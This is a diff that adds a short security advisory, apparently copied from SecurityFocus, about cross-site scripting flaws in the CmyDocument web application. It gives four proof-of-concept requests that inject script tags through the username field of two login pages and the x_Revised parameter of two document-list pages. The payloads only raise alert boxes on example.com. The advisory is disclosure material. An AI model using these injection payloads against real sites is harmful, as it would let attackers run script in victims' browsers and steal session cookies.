@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/50512/info
+
+CmyDocument is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+POST http://www.example.com/login.asp
+username="><script>alert(&#039;demonalex&#039;)</script>&password=bbb&rememberme=a&submit=+++Login+++
+
+POST http://www.example.com/login2.asp
+username="><script>alert(&#039;demonalex&#039;)</script>&password=bbb&rememberme=a&submit=+++Login+++
+
+http://www.example.com/myDoclist.asp?x_Title=a&z_Title=LIKE&x_Revised=<SCRIPT>alert("demonalex");</SCRIPT>&z_Revised==&x_KeyWords=info&z_KeyWords=LIKE&x_owner=a&z_owner=LIKE
+
+http://www.example.com/myWebDoclist.asp?x_Title=b&z_Title=LIKE&x_Revised=<SCRIPT>alert("demonalex");</SCRIPT>&z_Revised==&x_KeyWords=test&z_KeyWords=LIKE&x_owner=a&z_owner=LIKE
+
